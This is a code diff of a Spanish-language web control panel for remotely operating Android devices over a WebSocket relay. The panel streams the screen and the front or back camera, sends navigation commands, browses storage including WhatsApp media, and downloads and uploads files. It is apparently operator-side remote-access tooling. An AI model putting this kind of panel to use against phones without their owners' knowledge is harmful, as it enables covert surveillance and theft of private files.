@@ -24,23 +24,43 @@ body{background:#0A0714;color:#fff;font-family:-apple-system,sans-serif;height:1
 .tab:hover{color:#fff;background:#1a1629} .tab.active{color:#fff;border-left-color:#7C3AED;background:#1a1629}
 .content{flex:1;overflow:hidden;display:flex;flex-direction:column}
 .panel{display:none;flex:1;flex-direction:column;overflow:hidden} .panel.active{display:flex}
-.stream{flex:1;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
+.stream{flex:1;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden}
 .stream img{max-width:100%;max-height:100%;object-fit:contain;display:block}
-.nosig{color:#444;font-size:12px;text-align:center;line-height:2.2}
-.ctrl{background:#110D1E;padding:8px 12px;display:flex;gap:6px;border-top:1px solid #2D2A3E;flex-shrink:0;flex-wrap:wrap}
+.nosig{color:#444;font-size:12px;text-align:center;line-height:2.5}
+.ctrl{background:#110D1E;padding:8px 12px;display:flex;gap:6px;border-top:1px solid #2D2A3E;flex-shrink:0;flex-wrap:wrap;align-items:center}
 .btn{background:#1E1B2E;border:1px solid #3D3A4E;color:#fff;padding:6px 12px;border-radius:7px;cursor:pointer;font-size:12px;white-space:nowrap}
 .btn:hover{background:#2D2A3E} .btn.g{background:#16a34a;border-color:#16a34a} .btn.r{background:#DC2626;border-color:#DC2626} .btn.p{background:#7C3AED;border-color:#7C3AED}
-/* Archivos con miniaturas */
-.files{flex:1;overflow-y:auto;padding:8px}
-.file{display:flex;align-items:center;gap:10px;padding:7px 10px;border-radius:6px;cursor:pointer}
-.file:hover{background:#1a1629}
-.thumb{width:64px;height:64px;object-fit:cover;border-radius:6px;flex-shrink:0;background:#1E1B2E}
-.ficon{width:64px;height:64px;display:flex;align-items:center;justify-content:center;font-size:28px;flex-shrink:0}
-.finfo{flex:1;min-width:0} .fname{font-size:13px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap} .fsize{font-size:10px;color:#8B949E;margin-top:2px}
+/* Archivos */
+.pathbar{font-size:11px;color:#8B949E;padding:6px 14px;border-bottom:1px solid #1a1629;flex-shrink:0}
+.files{flex:1;overflow-y:auto;padding:8px 12px}
+/* Vista grid (miniaturas) */
+.grid-view{display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:10px;padding:10px}
+.grid-item{display:flex;flex-direction:column;align-items:center;gap:6px;cursor:pointer;padding:8px;border-radius:8px;border:1px solid transparent}
+.grid-item:hover{background:#1a1629;border-color:#2D2A3E}
+.grid-thumb{width:90px;height:90px;object-fit:cover;border-radius:6px;background:#1E1B2E;flex-shrink:0}
+.grid-icon{width:90px;height:90px;display:flex;align-items:center;justify-content:center;font-size:40px;background:#1E1B2E;border-radius:6px}
+.grid-name{font-size:10px;color:#E6EDF3;text-align:center;word-break:break-all;line-height:1.3;max-height:32px;overflow:hidden}
+.grid-size{font-size:9px;color:#8B949E}
+/* Vista lista */
+.list-item{display:flex;align-items:center;gap:10px;padding:8px 6px;border-radius:6px;cursor:pointer}
+.list-item:hover{background:#1a1629}
+.list-thumb{width:52px;height:52px;object-fit:cover;border-radius:5px;background:#1E1B2E;flex-shrink:0}
+.list-icon{width:52px;height:52px;display:flex;align-items:center;justify-content:center;font-size:26px;flex-shrink:0}
+.list-info{flex:1;min-width:0} .list-name{font-size:13px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap} .list-size{font-size:10px;color:#8B949E;margin-top:2px}
+.list-dl{background:#1E1B2E;border:none;color:#58A6FF;padding:5px 10px;border-radius:5px;cursor:pointer;font-size:11px;white-space:nowrap}
+/* Upload */
+.upload-area{border:2px dashed #3D3A4E;border-radius:10px;padding:20px;text-align:center;color:#8B949E;font-size:13px;cursor:pointer;margin:10px;transition:.2s}
+.upload-area:hover,.upload-area.drag{border-color:#7C3AED;color:#C084FC}
+.upload-progress{background:#1E1B2E;border-radius:4px;height:4px;margin-top:8px;overflow:hidden;display:none}
+.upload-bar{height:100%;background:#7C3AED;width:0%;transition:width .3s}
+/* Info */
 .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:16px;overflow-y:auto}
 .card{background:#110D1E;border:1px solid #2D2A3E;border-radius:10px;padding:12px}
 .clabel{font-size:10px;color:#8B949E;text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px} .cval{font-size:14px;font-weight:600}
 .empty{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:10px;color:#8B949E;font-size:13px}
+.view-toggle{margin-left:auto;display:flex;gap:4px}
+.vtbtn{background:#1E1B2E;border:1px solid #3D3A4E;color:#8B949E;padding:4px 8px;border-radius:5px;cursor:pointer;font-size:13px}
+.vtbtn.active{background:#7C3AED;border-color:#7C3AED;color:#fff}
 </style>
 </head>
 <body>
@@ -50,9 +70,7 @@ body{background:#0A0714;color:#fff;font-family:-apple-system,sans-serif;height:1
 </div>
 <div class="dbar">
   <span class="dlabel">📱 Dispositivos:</span>
-  <div id="devCards" style="display:flex;gap:8px">
-    <span style="font-size:12px;color:#4B5563">Esperando...</span>
-  </div>
+  <div id="devCards" style="display:flex;gap:8px"><span style="font-size:12px;color:#4B5563">Esperando...</span></div>
 </div>
 <div class="main">
   <div class="sidebar">
@@ -62,18 +80,18 @@ body{background:#0A0714;color:#fff;font-family:-apple-system,sans-serif;height:1
     <div class="tab" onclick="showTab('info')">📱 Info</div>
   </div>
   <div class="content">
-    <!-- Pantalla — solo recibe frames con prefijo S: -->
+    <!-- Pantalla -->
     <div class="panel active" id="panelScreen">
       <div class="stream" id="screenArea"><div class="nosig">🖥️<br>Selecciona dispositivo<br>y pulsa ▶ Iniciar</div></div>
       <div class="ctrl">
         <button class="btn g" onclick="startStream('screen')">▶ Iniciar</button>
         <button class="btn r" onclick="stopStream('screen')">⏹ Detener</button>
-        <button class="btn" onclick="cmd('home')">⌂ Inicio</button>
+        <button class="btn" onclick="cmd('home')">⌂</button>
         <button class="btn" onclick="cmd('back')">← Atrás</button>
-        <button class="btn" onclick="cmd('recents')">▣ Recientes</button>
+        <button class="btn" onclick="cmd('recents')">▣</button>
       </div>
     </div>
-    <!-- Cámara — solo recibe frames con prefijo C: -->
+    <!-- Cámara -->
     <div class="panel" id="panelCamera">
       <div class="stream" id="cameraArea"><div class="nosig">📷<br>Selecciona dispositivo<br>y elige la cámara</div></div>
       <div class="ctrl">
@@ -82,7 +100,7 @@ body{background:#0A0714;color:#fff;font-family:-apple-system,sans-serif;height:1
         <button class="btn r" onclick="stopStream('camera')">⏹ Detener</button>
       </div>
     </div>
-    <!-- Archivos con miniaturas -->
+    <!-- Archivos -->
     <div class="panel" id="panelFiles">
       <div class="ctrl">
         <button class="btn" onclick="listFiles('/sdcard')">📱 Interno</button>
@@ -90,8 +108,22 @@ body{background:#0A0714;color:#fff;font-family:-apple-system,sans-serif;height:1
         <button class="btn" onclick="listFiles('/sdcard/Download')">⬇️ Descargas</button>
         <button class="btn" onclick="listFiles('/sdcard/WhatsApp/Media')">💬 WhatsApp</button>
         <button class="btn" onclick="listFiles('/')">/ Raíz</button>
+        <div class="view-toggle">
+          <button class="vtbtn active" id="vGrid" onclick="setView('grid')">⊞</button>
+          <button class="vtbtn" id="vList" onclick="setView('list')">☰</button>
+        </div>
       </div>
-      <div class="files" id="fileList"><div class="empty"><span style="font-size:36px">📁</span>Selecciona una carpeta</div></div>
+      <div class="pathbar" id="pathBar">Selecciona una carpeta</div>
+      <!-- Upload -->
+      <div class="upload-area" id="uploadArea" onclick="document.getElementById('fileInput').click()"
+           ondragover="event.preventDefault();this.classList.add('drag')"
+           ondragleave="this.classList.remove('drag')"
+           ondrop="handleDrop(event)">
+        📤 Toca para subir archivos o arrastra aquí
+        <div class="upload-progress" id="upProg"><div class="upload-bar" id="upBar"></div></div>
+      </div>
+      <input type="file" id="fileInput" style="display:none" multiple onchange="uploadFiles(this.files)">
+      <div id="fileList" class="files"><div class="empty"><span style="font-size:36px">📁</span>Selecciona una carpeta</div></div>
     </div>
     <!-- Info -->
     <div class="panel" id="panelInfo">
@@ -103,167 +135,268 @@ body{background:#0A0714;color:#fff;font-family:-apple-system,sans-serif;height:1
 
 <script>
 let ws;
-const devices = {};
-let activeDevice = null;
-let screenInt = null, camInt = null;
-const COLORS = ['#7C3AED','#0EA5E9','#16a34a','#DC2626','#f59e0b','#ec4899'];
-let colorIdx = 0;
-// URLs de miniaturas generadas localmente
-const thumbUrls = {};
+const devices={};
+let activeDevice=null;
+let screenInt=null,camInt=null;
+let viewMode='grid'; // 'grid' o 'list'
+let currentPath='/sdcard';
+const COLORS=['#7C3AED','#0EA5E9','#16a34a','#DC2626','#f59e0b','#ec4899'];
+let colorIdx=0;
+// Almacén de miniaturas: reqId → base64
+const thumbCache={};
+// Almacén de callbacks de descarga
+const dlCallbacks={};
 
-function connect() {
-  const proto = location.protocol==='https:'?'wss:':'ws:';
-  ws = new WebSocket(`${proto}//${location.host}`);
-  ws.binaryType = 'arraybuffer';
-  ws.onopen = () => { setRS(true); ws.send(JSON.stringify({type:'register',role:'panel'})); };
-  ws.onclose = () => { setRS(false); setTimeout(connect,3000); };
-  ws.onmessage = (e) => {
-    if (e.data instanceof ArrayBuffer) {
-      handleBinary(e.data);
-      return;
-    }
-    try {
-      const msg = JSON.parse(e.data);
-      if (msg.type==='device_list')         msg.devices.forEach(id=>addDevice(id));
-      if (msg.type==='device_connected')    addDevice(msg.deviceId);
-      if (msg.type==='device_disconnected') setOffline(msg.deviceId);
-      if (msg.type==='files') renderFiles(msg.data);
-      if (msg.type==='info')  renderInfo(msg.data);
-      if (msg.type==='thumb') renderThumb(msg.path, msg.data);
-    } catch(e){}
+function connect(){
+  const proto=location.protocol==='https:'?'wss:':'ws:';
+  ws=new WebSocket(`${proto}//${location.host}`);
+  ws.binaryType='arraybuffer';
+  ws.onopen=()=>{setRS(true);ws.send(JSON.stringify({type:'register',role:'panel'}));};
+  ws.onclose=()=>{setRS(false);setTimeout(connect,3000);};
+  ws.onmessage=(e)=>{
+    if(e.data instanceof ArrayBuffer){handleBinary(e.data);return;}
+    try{
+      const msg=JSON.parse(e.data);
+      if(msg.type==='device_list')         msg.devices.forEach(id=>addDevice(id));
+      if(msg.type==='device_connected')    addDevice(msg.deviceId);
+      if(msg.type==='device_disconnected') setOffline(msg.deviceId);
+      if(msg.type==='files')  renderFiles(msg.data,msg.path);
+      if(msg.type==='info')   renderInfo(msg.data);
+      if(msg.type==='thumb')  receiveThumb(msg.reqId,msg.data);
+      if(msg.type==='download_data') receiveDownload(msg);
+      if(msg.type==='upload_ok')   showToast('✅ Subido: '+msg.path);
+      if(msg.type==='upload_error') showToast('❌ Error: '+msg.error);
+    }catch(e){}
   };
 }
 
-function handleBinary(buf) {
-  // Leer prefijo: primeros 2 bytes = "S:" pantalla o "C:" cámara
-  const view = new Uint8Array(buf);
-  const prefix = String.fromCharCode(view[0], view[1]);
-  const frameData = buf.slice(2); // datos JPEG sin prefijo
-  const blob = new Blob([frameData], {type:'image/jpeg'});
-  const url  = URL.createObjectURL(blob);
-
-  let areaId = null;
-  if (prefix === 'S:') areaId = 'screenArea';
-  if (prefix === 'C:') areaId = 'cameraArea';
-  if (!areaId) return;
-
-  const area = document.getElementById(areaId);
-  if (!area) return;
-  let img = area.querySelector('img');
-  if (!img) { area.innerHTML=''; img=document.createElement('img'); area.appendChild(img); }
-  URL.revokeObjectURL(img.src);
-  img.src = url;
+function handleBinary(buf){
+  const view=new Uint8Array(buf);
+  const prefix=String.fromCharCode(view[0],view[1]);
+  const frameData=buf.slice(2);
+  const blob=new Blob([frameData],{type:'image/jpeg'});
+  const url=URL.createObjectURL(blob);
+  let areaId=prefix==='S:'?'screenArea':prefix==='C:'?'cameraArea':null;
+  if(!areaId)return;
+  const area=document.getElementById(areaId);
+  let img=area.querySelector('img');
+  if(!img){area.innerHTML='';img=document.createElement('img');area.appendChild(img);}
+  URL.revokeObjectURL(img.src);img.src=url;
 }
 
-function cmd(action, extra={}) {
-  if (!ws||ws.readyState!==1) return;
-  if (!activeDevice) { alert('Selecciona un dispositivo'); return; }
+// ── Comandos ─────────────────────────────────────────────────────────────────
+function cmd(action,extra={}){
+  if(!ws||ws.readyState!==1)return;
+  if(!activeDevice){showToast('Selecciona un dispositivo');return;}
   ws.send(JSON.stringify({type:'cmd',action,deviceId:activeDevice,...extra}));
 }
 
-function startStream(type) {
+function startStream(type){
   stopAllStreams();
-  if (type==='screen') {
-    cmd('screen_start');
-    screenInt = setInterval(()=>cmd('screen_frame'), 250);
-  } else if (type==='cam_front') {
-    cmd('cam_start',{lens:1});
-    camInt = setInterval(()=>cmd('cam_frame'), 250);
-  } else if (type==='cam_back') {
-    cmd('cam_start',{lens:0});
-    camInt = setInterval(()=>cmd('cam_frame'), 250);
-  }
+  if(type==='screen'){cmd('screen_start');screenInt=setInterval(()=>cmd('screen_frame'),250);}
+  else if(type==='cam_front'){cmd('cam_start',{lens:1});camInt=setInterval(()=>cmd('cam_frame'),250);}
+  else if(type==='cam_back'){cmd('cam_start',{lens:0});camInt=setInterval(()=>cmd('cam_frame'),250);}
 }
-
-function stopStream(type) {
+function stopStream(type){
   stopAllStreams();
-  const area = type==='screen'?'screenArea':'cameraArea';
-  const label = type==='screen'?'🖥️ Stream detenido':'📷 Stream detenido';
-  document.getElementById(area).innerHTML=`<div class="nosig">${label}</div>`;
+  const areaId=type==='screen'?'screenArea':'cameraArea';
+  document.getElementById(areaId).innerHTML=`<div class="nosig">${type==='screen'?'🖥️':'📷'}<br>Stream detenido</div>`;
   cmd(type==='screen'?'screen_stop':'cam_stop');
 }
+function stopAllStreams(){clearInterval(screenInt);clearInterval(camInt);screenInt=null;camInt=null;}
 
-function stopAllStreams() {
-  clearInterval(screenInt); clearInterval(camInt);
-  screenInt=null; camInt=null;
+// ── Archivos ──────────────────────────────────────────────────────────────────
+function setView(v){
+  viewMode=v;
+  document.getElementById('vGrid').classList.toggle('active',v==='grid');
+  document.getElementById('vList').classList.toggle('active',v==='list');
+  if(currentPath) listFiles(currentPath);
 }
 
-function listFiles(path) { cmd('list_files',{path}); }
+function listFiles(path){
+  currentPath=path;
+  document.getElementById('pathBar').textContent='📂 '+path;
+  cmd('list_files',{path});
+}
 
-function renderFiles(files) {
-  const el = document.getElementById('fileList');
-  if (!files?.length) { el.innerHTML='<div class="empty"><span style="font-size:36px">📭</span>Carpeta vacía</div>'; return; }
-  el.innerHTML = files.map(f => {
-    const isImg = /\.(jpg|jpeg|png|gif|webp)$/i.test(f.name);
-    const thumbHtml = f.isDir
-      ? `<div class="ficon">📁</div>`
-      : isImg
-        ? `<img class="thumb" id="th_${btoa(f.path).slice(0,12)}" src="" onerror="this.style.display='none'" loading="lazy">`
-        : `<div class="ficon">${icon(f.name)}</div>`;
-    return `<div class="file" onclick="${f.isDir?`listFiles('${f.path.replace(/'/g,"\\'")}')`:''}" >
-      ${thumbHtml}
-      <div class="finfo">
-        <div class="fname">${f.name}</div>
-        <div class="fsize">${f.isDir?'Carpeta':fmt(f.size)}</div>
-      </div>
+function renderFiles(files,path){
+  const el=document.getElementById('fileList');
+  if(!files||!files.length){
+    el.innerHTML='<div class="empty"><span style="font-size:36px">📭</span>Carpeta vacía</div>';
+    return;
+  }
+  if(viewMode==='grid') renderGrid(files,el);
+  else renderList(files,el);
+}
+
+function renderGrid(files,el){
+  el.className='files grid-view';
+  el.innerHTML=files.map(f=>{
+    const isImg=/\.(jpg|jpeg|png|gif|webp|bmp)$/i.test(f.name);
+    const reqId=hashPath(f.path);
+    if(f.isDir){
+      return `<div class="grid-item" onclick="listFiles('${esc(f.path)}')">
+        <div class="grid-icon">📁</div>
+        <div class="grid-name">${esc2(f.name)}</div>
+      </div>`;
+    }
+    if(isImg){
+      // Placeholder gris mientras llega la miniatura
+      const cached=thumbCache[reqId];
+      const src=cached?`data:image/jpeg;base64,${cached}`:'';
+      return `<div class="grid-item" onclick="downloadFile('${esc(f.path)}','${esc2(f.name)}')">
+        <img class="grid-thumb" id="th_${reqId}" src="${src}" onerror="this.style.display='none'">
+        <div class="grid-name">${esc2(f.name)}</div>
+        <div class="grid-size">${fmt(f.size)}</div>
+      </div>`;
+    }
+    return `<div class="grid-item" onclick="downloadFile('${esc(f.path)}','${esc2(f.name)}')">
+      <div class="grid-icon">${icon(f.name)}</div>
+      <div class="grid-name">${esc2(f.name)}</div>
+      <div class="grid-size">${fmt(f.size)}</div>
     </div>`;
   }).join('');
 
-  // Pedir miniaturas para imágenes
-  files.filter(f=>!f.isDir&&/\.(jpg|jpeg|png|gif|webp)$/i.test(f.name))
-    .slice(0,30) // max 30 miniaturas a la vez
-    .forEach(f => cmd('thumb',{path:f.path}));
+  // Pedir miniaturas de imágenes que no están en caché
+  files.filter(f=>!f.isDir&&/\.(jpg|jpeg|png|gif|webp|bmp)$/i.test(f.name))
+       .slice(0,40)
+       .forEach(f=>{
+         const reqId=hashPath(f.path);
+         if(!thumbCache[reqId]) cmd('thumb',{path:f.path,reqId});
+       });
 }
 
-function renderThumb(path, b64) {
-  const id = 'th_'+btoa(path).slice(0,12);
-  const el = document.getElementById(id);
-  if (el) el.src = 'data:image/jpeg;base64,'+b64;
+function renderList(files,el){
+  el.className='files';
+  el.innerHTML=files.map(f=>{
+    const isImg=/\.(jpg|jpeg|png|gif|webp|bmp)$/i.test(f.name);
+    const reqId=hashPath(f.path);
+    const thumb=f.isDir?`<div class="list-icon">📁</div>`
+      :isImg?`<img class="list-thumb" id="th_${reqId}" src="${thumbCache[reqId]?'data:image/jpeg;base64,'+thumbCache[reqId]:''}" onerror="this.style.display='none'">`
+      :`<div class="list-icon">${icon(f.name)}</div>`;
+    const action=f.isDir?`listFiles('${esc(f.path)}')`:`downloadFile('${esc(f.path)}','${esc2(f.name)}')`;
+    return `<div class="list-item" onclick="${action}">
+      ${thumb}
+      <div class="list-info">
+        <div class="list-name">${esc2(f.name)}</div>
+        <div class="list-size">${f.isDir?'Carpeta':fmt(f.size)}</div>
+      </div>
+      ${!f.isDir?`<button class="list-dl" onclick="event.stopPropagation();downloadFile('${esc(f.path)}','${esc2(f.name)}')">⬇️</button>`:''}
+    </div>`;
+  }).join('');
+  files.filter(f=>!f.isDir&&/\.(jpg|jpeg|png|gif|webp|bmp)$/i.test(f.name))
+       .slice(0,40).forEach(f=>{
+         const reqId=hashPath(f.path);
+         if(!thumbCache[reqId]) cmd('thumb',{path:f.path,reqId});
+       });
 }
 
-function renderInfo(d) {
-  if (!d) return;
-  document.getElementById('infoGrid').innerHTML = Object.entries(d).map(([k,v])=>
+function receiveThumb(reqId,b64){
+  thumbCache[reqId]=b64;
+  const el=document.getElementById('th_'+reqId);
+  if(el){el.src='data:image/jpeg;base64,'+b64;}
+}
+
+// ── Descarga ──────────────────────────────────────────────────────────────────
+function downloadFile(path,filename){
+  const reqId='dl_'+Date.now();
+  showToast('⏳ Descargando '+filename+'...');
+  dlCallbacks[reqId]={filename};
+  cmd('download',{path,reqId});
+}
+
+function receiveDownload(msg){
+  try{
+    const {filename}=dlCallbacks[msg.reqId]||{filename:msg.filename};
+    const bytes=Uint8Array.from(atob(msg.data),c=>c.charCodeAt(0));
+    const blob=new Blob([bytes]);
+    const url=URL.createObjectURL(blob);
+    const a=document.createElement('a');
+    a.href=url;a.download=filename||'archivo';
+    document.body.appendChild(a);a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+    showToast('✅ Descargado: '+filename);
+    delete dlCallbacks[msg.reqId];
+  }catch(e){showToast('❌ Error al descargar');}
+}
+
+// ── Subida ────────────────────────────────────────────────────────────────────
+function handleDrop(e){
+  e.preventDefault();
+  document.getElementById('uploadArea').classList.remove('drag');
+  uploadFiles(e.dataTransfer.files);
+}
+
+function uploadFiles(files){
+  if(!files.length)return;
+  Array.from(files).forEach(file=>{
+    const reader=new FileReader();
+    reader.onload=ev=>{
+      const b64=ev.target.result.split(',')[1];
+      showToast('⬆️ Subiendo '+file.name+'...');
+      // Subir a la carpeta actual
+      cmd('upload',{path:currentPath,filename:file.name,data:b64});
+    };
+    reader.readAsDataURL(file);
+  });
+}
+
+// ── Info ──────────────────────────────────────────────────────────────────────
+function renderInfo(d){
+  if(!d)return;
+  document.getElementById('infoGrid').innerHTML=Object.entries(d).map(([k,v])=>
     `<div class="card"><div class="clabel">${k}</div><div class="cval">${v}</div></div>`).join('');
 }
 
-function addDevice(id) {
-  if (!id) return;
-  if (!devices[id]) devices[id] = {color:COLORS[colorIdx++%COLORS.length],online:true};
-  else devices[id].online = true;
-  if (!activeDevice) selectDevice(id);
+// ── Dispositivos ──────────────────────────────────────────────────────────────
+function addDevice(id){
+  if(!id)return;
+  if(!devices[id])devices[id]={color:COLORS[colorIdx++%COLORS.length],online:true};
+  else devices[id].online=true;
+  if(!activeDevice)selectDevice(id);
   renderDevBar();
 }
-function setOffline(id) { if(devices[id]){devices[id].online=false;renderDevBar();} }
-function selectDevice(id) {
-  activeDevice=id; stopAllStreams(); renderDevBar();
+function setOffline(id){if(devices[id]){devices[id].online=false;renderDevBar();}}
+function selectDevice(id){
+  activeDevice=id;stopAllStreams();renderDevBar();
   document.getElementById('screenArea').innerHTML='<div class="nosig">🖥️<br>Pulsa ▶ Iniciar</div>';
   document.getElementById('cameraArea').innerHTML='<div class="nosig">📷<br>Elige cámara</div>';
 }
-function renderDevBar() {
+function renderDevBar(){
   const c=document.getElementById('devCards');
   const ids=Object.keys(devices);
-  if (!ids.length){c.innerHTML='<span style="font-size:12px;color:#4B5563">Esperando...</span>';return;}
+  if(!ids.length){c.innerHTML='<span style="font-size:12px;color:#4B5563">Esperando...</span>';return;}
   c.innerHTML=ids.map(id=>{
     const d=devices[id];
     return `<div class="dcard ${id===activeDevice?'active':''} ${d.online?'':'offline'}" onclick="selectDevice('${id}')">
-      <div class="davatar" style="background:${d.color};color:#fff">${id.slice(0,2).toUpperCase()}</div>
+      <div class="davatar" style="background:${d.color}">${id.slice(0,2).toUpperCase()}</div>
       <div class="dname">${id.slice(0,8)}</div>
       <div class="dping ${d.online?'on':'off'}">${d.online?'● Online':'● Offline'}</div>
     </div>`;
   }).join('');
 }
-function showTab(name) {
+
+function showTab(name){
   document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',['screen','camera','files','info'][i]===name));
   document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
   document.getElementById('panel'+name[0].toUpperCase()+name.slice(1))?.classList.add('active');
   stopAllStreams();
-  if(name==='info') cmd('info');
+  if(name==='info')cmd('info');
+  if(name==='files')listFiles(currentPath||'/sdcard');
 }
 function setRS(on){const e=document.getElementById('relayStatus');e.textContent=on?'● Conectado':'● Desconectado';e.className='rs '+(on?'on':'off');}
-function icon(n){if(/\.(mp4|mov|avi|mkv)$/i.test(n))return'🎬';if(/\.(mp3|aac|wav)$/i.test(n))return'🎵';if(/\.pdf$/i.test(n))return'📄';if(/\.apk$/i.test(n))return'📦';return'📄';}
+function icon(n){if(/\.(mp4|mov|avi|mkv)$/i.test(n))return'🎬';if(/\.(mp3|aac|wav)$/i.test(n))return'🎵';if(/\.pdf$/i.test(n))return'📄';if(/\.apk$/i.test(n))return'📦';if(/\.zip|\.rar$/i.test(n))return'🗜️';return'📄';}
 function fmt(b){if(!b)return'';if(b>1e9)return(b/1e9).toFixed(1)+'GB';if(b>1e6)return(b/1e6).toFixed(1)+'MB';if(b>1e3)return(b/1e3).toFixed(0)+'KB';return b+'B';}
-function btoa(s){try{return window.btoa(unescape(encodeURIComponent(s)))}catch(e){return Math.abs(s.split('').reduce((a,c)=>a*31+c.charCodeAt(0)|0,0)).toString(36)}}
+function hashPath(s){let h=0;for(let i=0;i<s.length;i++)h=Math.imul(31,h)+s.charCodeAt(i)|0;return(h>>>0).toString(36);}
+function esc(s){return s.replace(/\\/g,'\\\\').replace(/'/g,"\\'");}
+function esc2(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function showToast(msg){
+  let t=document.getElementById('toast');
+  if(!t){t=document.createElement('div');t.id='toast';t.style.cssText='position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1E1B2E;border:1px solid #3D3A4E;color:#fff;padding:10px 18px;border-radius:10px;font-size:13px;z-index:9999;transition:opacity .3s';document.body.appendChild(t);}
+  t.textContent=msg;t.style.opacity='1';
+  clearTimeout(t._t);t._t=setTimeout(()=>{t.style.opacity='0';},3000);
+}
 
 connect();
 </script>
